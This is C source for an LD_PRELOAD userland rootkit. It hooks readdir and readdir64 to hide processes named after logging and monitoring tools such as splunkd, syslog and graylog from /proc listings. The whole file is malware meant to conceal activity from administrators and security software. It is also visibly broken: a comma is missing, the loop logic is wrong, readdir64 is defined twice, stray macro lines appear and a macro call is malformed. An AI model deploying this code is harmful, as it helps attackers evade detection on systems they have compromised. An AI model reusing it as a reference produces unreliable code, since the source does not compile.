#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

/*
 * List of process names to hide.
 * Add as many as you want, ending with a NULL.
 */
static const char* processes_to_filter[] = {
    "splunkd",
    "splunk",
    "syslog",
    "graylog",
    "log",
    "notlog",
    "notlog_tcp",
    "syslog_tcp",
    "log_tcp",
    "splunk_tcp"
    NULL
};

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    // Read pid and process name (within parentheses)
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent_type, readdir_fn, readdir_struct)        \
static readdir_struct* (*original_##readdir_fn)(DIR*) = NULL;           \
                                                                         \
readdir_struct* readdir_fn(DIR *dirp)                                    \
{                                                                        \
    if(original_##readdir_fn == NULL) {                                  \
        original_##readdir_fn = dlsym(RTLD_NEXT, #readdir_fn);          \
        if(original_##readdir_fn == NULL) {                              \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());          \
        }                                                                \
    }                                                                    \
                                                                         \
    readdir_struct* dir;                                                 \
                                                                         \
    while(1) {                                                            \
        dir = original_##readdir_fn(dirp);                               \
        if(dir) {                                                         \
            char dir_name[256];                                           \
            char process_name[256];                                       \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&         \
               strcmp(dir_name, "/proc") == 0 &&                          \
               get_process_name(dir->d_name, process_name)) {            \
                int hide = 0;                                             \
                for (int i = 0; processes_to_filter[i] != NULL; i++) {   \
                    if(strcmp(process_name, processes_to_filter[i]) == 0) { \
                        hide = 1;                                         \
                        break;                                            \
                    }                                                    \
                }                                                        \
                if (hide) {                                              \
                    continue;                                            \
                }                                                        \
            }                                                            \
        } else {                                                         \
            break;                                                       \
        }                                                                \
    }                                                                    \
    return dir;                                                          \
}

// Declare both wrappers with correct return types
DECLARE_READDIR(dirent, readdir, struct dirent)
DECLARE_READDIR(dirent64, readdir64, struct dirent64)

                                                                        \
struct dirent* readdir64(DIR *dirp)                                     \
{                                                                       \
    return readdir(dirp);                                               \
}

DECLARE_READDIR(dirent, readdir);
